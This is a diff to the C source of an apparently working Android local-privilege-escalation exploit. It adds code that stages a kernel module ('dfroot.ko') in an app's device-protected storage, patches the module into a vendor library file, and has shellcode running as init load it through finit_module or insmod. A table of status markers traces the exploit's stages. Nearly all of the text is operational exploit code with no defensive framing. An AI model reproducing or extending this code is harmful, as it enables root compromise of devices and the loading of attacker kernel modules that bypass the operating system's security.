@@ -468,6 +468,26 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     return rc;
 }
 
+/* The app can write its own device-protected directory with plain file I/O, and
+ * the shellcode (running as init, which already reads our shared_prefs) can read
+ * it back. That path is ordinary storage, so page reclaim cannot corrupt it -
+ * unlike the staged copy inside a vendor library. */
+#define LOCAL_KO "/data/user_de/0/df.root/ko"
+
+static int stage_local_ko(const char *data, size_t len)
+{
+    int fd = open(LOCAL_KO, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) { printf("local ko: open failed: %s\n", strerror(errno)); return -1; }
+    ssize_t n = write(fd, data, len);
+    close(fd);
+    if (n != (ssize_t)len) {
+        printf("local ko: short write %zd/%zu\n", n, len);
+        return -1;
+    }
+    printf("local ko: wrote %zu bytes to %s\n", len, LOCAL_KO);
+    return 0;
+}
+
 /* ---- KO and splicehelper blobs ---- */
 
 /* The module actually selected for this device, kept so that it can be
@@ -624,6 +644,9 @@ static int patch_ko(void) {
 
     g_ko_data = buf;
     g_ko_len  = len;
+
+    /* Private copy first: the payload prefers finit_module on this one. */
+    stage_local_ko(ko->start, (size_t)(ko->end - ko->start));
 
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
@@ -951,6 +974,8 @@ static int exploit(void) {
         { "/dev/dfw2",  "shellcode: grandchild forked",                     -1 },
         { "/dev/dfw3",  "shellcode: wrote attr/exec, exec'ing insmod",       -1 },
         { "/dev/dfw4",  "shellcode: /vendor/bin/insmod missing, fell back",  -1 },
+        { "/dev/dfk0",  "shellcode: finit_module loaded the app copy",       -1 },
+        { "/dev/dfk1",  "shellcode: finit_module refused, fell back to insmod", -1 },
         { "/dev/dfw5",  "shellcode: BOTH insmod paths failed",                1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
